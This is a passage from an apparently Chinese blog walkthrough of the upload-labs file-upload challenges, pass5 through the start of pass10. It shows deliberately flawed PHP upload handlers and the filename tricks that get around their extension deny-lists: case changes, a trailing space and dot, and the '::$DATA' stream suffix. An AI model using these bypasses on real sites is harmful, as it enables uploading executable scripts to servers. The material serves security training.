class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre>

<p>本题与第十题完全一样，详细解答见第十题</p>
<img src="/2021/03/03/net-a-and-d/E:%5Cmyblog%5Cszyblog%5Csource%5C_posts%5Cuploads%5C5.png" style="zoom:50%;">



<h2 id="pass6"><a href="#pass6" class="headerlink" title="pass6"></a>pass6</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>

        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre>

<p>仔细查看源码会发现少了下面的这段代码</p>
<pre><code class="hljs php"><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span></code></pre>

<p>这里就可以大小写绕过。将文件后缀名改为<code>.pHp , .PHP</code>等</p>
<h2 id="pass7"><a href="#pass7" class="headerlink" title="pass7"></a>pass7</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre>

<p>跟第六关对比发现少了这句话</p>
<pre><code>  $file_ext = trim($file_ext); //首尾去空
</code></pre>
<p> <strong>利用Windows系统的文件名特性。文件名最后增加空格和点，写成<code>1.php .</code>，这个需要用burpsuite抓包修改，上传后保存在Windows系统上的文件名最后的一个<code>.</code>会被去掉，实际上保存的文件名就是1<code>.php</code></strong> </p>
<img src="https://i.loli.net/2020/11/30/QsiotIUBjlkmYqc.png" style="zoom:67%;">





<h2 id="pass8"><a href="#pass8" class="headerlink" title="pass8"></a>pass8</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre>

<p>这段代码少了这句话，可以与第六关相同的做法</p>
<p><code>$file_name = deldot($file_name);//删除文件名末尾的点</code></p>
<img src="https://i.loli.net/2020/11/30/tyb45fg3MiCU1jG.png" style="zoom:67%;">

<h2 id="pass9"><a href="#pass9" class="headerlink" title="pass9"></a>pass9</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre>

<p>仔细观察发现少了这段代码</p>
<pre><code class="hljs php"><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span></code></pre>

<p> 采用Windows文件流特性绕过 </p>
<p>将文件名改为 <code>1.php::$DATA</code>,但是实质上保存的文件还是1.php</p>
<img src="https://i.loli.net/2020/11/30/XKUGAeVRzTxNW8Y.png" style="zoom:50%;">

<h2 id="pass10"><a href="#pass10" class="headerlink" title="pass10"></a>pass10</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;
